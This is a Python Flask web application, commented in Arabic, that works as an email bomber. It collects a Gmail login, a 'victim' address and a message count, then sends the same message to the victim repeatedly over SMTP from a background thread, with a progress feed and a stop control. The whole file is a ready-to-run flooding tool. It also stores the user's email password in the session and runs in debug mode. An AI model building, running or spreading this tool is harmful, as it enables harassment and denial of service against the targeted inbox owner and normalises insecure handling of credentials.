from flask import Flask, render_template, request, flash, Response, session
import smtplib
from time import sleep
import threading

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # مفتاح سري لأغراض التشفير

# حالة الإرسال العامة
status = {
    'running': False,
    'progress': 0,
    'total': 0,
    'current': 0,
    'stop': False
}

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if status['running']:
            flash('عملية إرسال جارية بالفعل!', 'error')
            return render_template('form.html')
        
        # حفظ الإعدادات في الجلسة
        session['email'] = request.form.get('email')
        session['password'] = request.form.get('password')
        session['victim'] = request.form.get('victim')
        session['subject'] = request.form.get('subject')
        session['message_body'] = request.form.get('message_body')
        session['number'] = int(request.form.get('number'))
        
        # بدء الإرسال في thread منفصل
        threading.Thread(target=send_emails).start()
        
    return render_template('form.html')

def send_emails():
    try:
        status.update({
            'running': True,
            'progress': 0,
            'total': session['number'],
            'current': 0,
            'stop': False
        })
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(session['email'], session['password'])
        
        message = f"Subject: {session['subject']}\n\n{session['message_body']}"
        
        for i in range(session['number']):
            if status['stop']:
                break
                
            server.sendmail(session['email'], [session['victim']], message)
            status['current'] = i + 1
            status['progress'] = int((status['current'] / status['total']) * 100)
            sleep(0.1)
            
        server.quit()
        
    except Exception as e:
        status['stop'] = True
        flash(f'حدث خطأ: {str(e)}', 'error')
    finally:
        status['running'] = False

@app.route('/progress')
def progress():
    def generate():
        while status['running']:
            yield f"data:{status['progress']}|{status['current']}|{status['total']}\n\n"
            sleep(0.5)
    return Response(generate(), mimetype='text/event-stream')

@app.route('/stop', methods=['POST'])
def stop():
    status['stop'] = True
    return '', 204

if __name__ == '__main__':
    app.run(debug=True)
